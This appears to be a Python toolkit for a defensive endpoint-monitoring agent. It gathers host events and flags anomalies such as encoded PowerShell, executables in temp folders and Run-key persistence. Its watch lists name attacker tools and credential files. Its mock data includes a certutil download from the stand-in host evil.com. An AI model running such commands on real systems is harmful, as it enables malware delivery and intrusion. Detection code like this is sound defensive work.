"""Endpoint Behavior Monitor Agent — Tool functions."""

from __future__ import annotations

import hashlib
from datetime import UTC, datetime
from typing import Any

import structlog

from .models import AnomalyType, Severity

logger = structlog.get_logger()

_SUSPICIOUS_PROCESSES = {
    "mimikatz.exe",
    "psexec.exe",
    "cobalt_strike",
    "powershell_encoded",
    "certutil.exe",
    "mshta.exe",
    "regsvr32.exe",
    "rundll32.exe",
    "wmic.exe",
}

_SENSITIVE_PATHS = {
    "/etc/shadow",
    "/etc/passwd",
    "SAM",
    "SYSTEM",
    "NTDS.dit",
    "lsass.dmp",
}


def _generate_id(prefix: str, *parts: str) -> str:
    raw = f"{':'.join(parts)}:{datetime.now(UTC).isoformat()}"
    return f"{prefix}-{hashlib.sha256(raw.encode()).hexdigest()[:8].upper()}"


class EndpointBehaviorMonitorToolkit:
    """Tools for endpoint behavior monitoring and analysis."""

    def __init__(
        self,
        edr_client: Any | None = None,
        siem_client: Any | None = None,
    ) -> None:
        self._edr = edr_client
        self._siem = siem_client

    async def collect_process_events(self, endpoint_id: str) -> list[dict[str, Any]]:
        """Collect process execution events from endpoint."""
        logger.info("ebm.collect_processes", endpoint_id=endpoint_id)
        if self._edr:
            try:
                return await self._edr.get_process_events(endpoint_id=endpoint_id)
            except Exception:
                logger.exception("ebm.collect_processes.error")
        return [
            {
                "pid": 4532,
                "name": "powershell.exe",
                "path": "C:\\Windows\\System32\\powershell.exe",
                "command_line": "powershell -enc SQBFAFgA",
                "parent_pid": 1200,
                "parent_name": "cmd.exe",
                "user": "SYSTEM",
            },
            {
                "pid": 7801,
                "name": "svchost.exe",
                "path": "C:\\Windows\\System32\\svchost.exe",
                "command_line": "svchost.exe -k netsvcs",
                "parent_pid": 680,
                "parent_name": "services.exe",
                "user": "SYSTEM",
            },
            {
                "pid": 9102,
                "name": "certutil.exe",
                "path": "C:\\Windows\\System32\\certutil.exe",
                "command_line": "certutil -urlcache -split -f http://evil.com/payload",
                "parent_pid": 4532,
                "parent_name": "powershell.exe",
                "user": "admin",
            },
        ]

    async def collect_filesystem_events(self, endpoint_id: str) -> list[dict[str, Any]]:
        """Collect filesystem change events."""
        logger.info("ebm.collect_fs", endpoint_id=endpoint_id)
        if self._edr:
            try:
                return await self._edr.get_filesystem_events(endpoint_id=endpoint_id)
            except Exception:
                logger.exception("ebm.collect_fs.error")
        return [
            {
                "path": "C:\\Windows\\Temp\\payload.exe",
                "action": "created",
                "user": "admin",
            },
            {
                "path": "C:\\Users\\admin\\Documents\\data.xlsx",
                "action": "modified",
                "user": "admin",
            },
        ]

    async def collect_registry_events(self, endpoint_id: str) -> list[dict[str, Any]]:
        """Collect registry modification events."""
        logger.info("ebm.collect_reg", endpoint_id=endpoint_id)
        return [
            {
                "key": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                "action": "value_set",
                "value_name": "UpdateService",
                "value_data": "C:\\Windows\\Temp\\payload.exe",
                "user": "admin",
            },
        ]

    async def collect_network_events(self, endpoint_id: str) -> list[dict[str, Any]]:
        """Collect network connection events."""
        logger.info("ebm.collect_net", endpoint_id=endpoint_id)
        return [
            {
                "src_ip": "10.0.1.50",
                "src_port": 49152,
                "dst_ip": "185.220.101.42",
                "dst_port": 443,
                "protocol": "tcp",
                "process_name": "powershell.exe",
                "bytes_sent": 2048,
                "bytes_received": 512000,
            },
            {
                "src_ip": "10.0.1.50",
                "src_port": 49200,
                "dst_ip": "10.0.1.100",
                "dst_port": 445,
                "protocol": "tcp",
                "process_name": "svchost.exe",
                "bytes_sent": 1024,
                "bytes_received": 256,
            },
        ]

    async def collect_usb_events(self, endpoint_id: str) -> list[dict[str, Any]]:
        """Collect USB device events."""
        logger.info("ebm.collect_usb", endpoint_id=endpoint_id)
        return [
            {
                "device_id": "USB\\VID_0781&PID_5567",
                "device_name": "SanDisk Cruzer",
                "action": "connected",
                "user": "admin",
                "serial": "4C530012345678",
            },
        ]

    async def analyze_anomalies(
        self,
        process_events: list[dict[str, Any]],
        fs_events: list[dict[str, Any]],
        registry_events: list[dict[str, Any]],
        network_events: list[dict[str, Any]],
        usb_events: list[dict[str, Any]],
    ) -> tuple[list[dict[str, Any]], float]:
        """Analyze collected events for anomalies."""
        logger.info("ebm.analyze")
        anomalies: list[dict[str, Any]] = []
        risk = 0.0

        for proc in process_events:
            name = proc.get("name", "").lower()
            cmd = proc.get("command_line", "").lower()
            if any(s in name for s in _SUSPICIOUS_PROCESSES):
                anomalies.append(
                    {
                        "id": _generate_id("ANO", name),
                        "type": AnomalyType.SUSPICIOUS_EXECUTION.value,
                        "severity": Severity.HIGH.value,
                        "source": "process",
                        "details": f"Suspicious process: {name}",
                        "evidence": proc,
                    }
                )
                risk += 20.0
            if "-enc" in cmd or "encodedcommand" in cmd:
                anomalies.append(
                    {
                        "id": _generate_id("ANO", "encoded_cmd"),
                        "type": AnomalyType.PROCESS_INJECTION.value,
                        "severity": Severity.CRITICAL.value,
                        "source": "process",
                        "details": f"Encoded command execution: {name}",
                        "evidence": proc,
                    }
                )
                risk += 30.0

        for fs_ev in fs_events:
            path = fs_ev.get("path", "")
            if path.endswith(".exe") and "Temp" in path:
                anomalies.append(
                    {
                        "id": _generate_id("ANO", path),
                        "type": AnomalyType.FILE_TAMPERING.value,
                        "severity": Severity.HIGH.value,
                        "source": "filesystem",
                        "details": f"Executable in temp dir: {path}",
                        "evidence": fs_ev,
                    }
                )
                risk += 15.0

        for reg_ev in registry_events:
            key = reg_ev.get("key", "")
            if "Run" in key:
                anomalies.append(
                    {
                        "id": _generate_id("ANO", key),
                        "type": AnomalyType.REGISTRY_MODIFICATION.value,
                        "severity": Severity.HIGH.value,
                        "source": "registry",
                        "details": f"Persistence via registry: {key}",
                        "evidence": reg_ev,
                    }
                )
                risk += 20.0

        for net_ev in network_events:
            dst = net_ev.get("dst_ip", "")
            if not dst.startswith("10.") and not dst.startswith("192.168."):
                net_ev.get("bytes_sent", 0)
                recv = net_ev.get("bytes_received", 0)
                if recv > 100000:
                    anomalies.append(
                        {
                            "id": _generate_id("ANO", dst),
                            "type": AnomalyType.DATA_EXFILTRATION.value,
                            "severity": Severity.CRITICAL.value,
                            "source": "network",
                            "details": (f"Large download from external IP {dst} ({recv} bytes)"),
                            "evidence": net_ev,
                        }
                    )
                    risk += 25.0

        risk = min(risk, 100.0)
        return anomalies, risk
